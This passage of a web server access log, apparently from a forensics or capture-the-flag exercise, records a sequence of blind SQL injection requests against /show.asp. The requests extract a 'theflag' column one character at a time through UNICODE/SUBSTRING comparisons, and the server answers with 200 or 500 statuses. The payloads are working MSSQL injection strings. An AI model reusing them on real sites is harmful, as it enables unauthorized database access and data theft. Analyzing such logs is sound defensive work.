UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),1,1))&gt;53|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),2,1))&gt;49 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),3,1))&gt;99|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;52 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;54|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),4,1))&gt;53 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;100 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;102|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),5,1))&gt;101 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;56|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;52|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;50|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),6,1))&gt;49|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;64 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;96 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;112|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;104|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;100|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;98 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),7,1))&gt;99 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;64|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;32 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)&gt;CHAR(32)),8,1))&gt;48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">2015-10-21 09:32:36 W3SVC1 192.168.1.135 GET /show.asp id=2 AND UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM 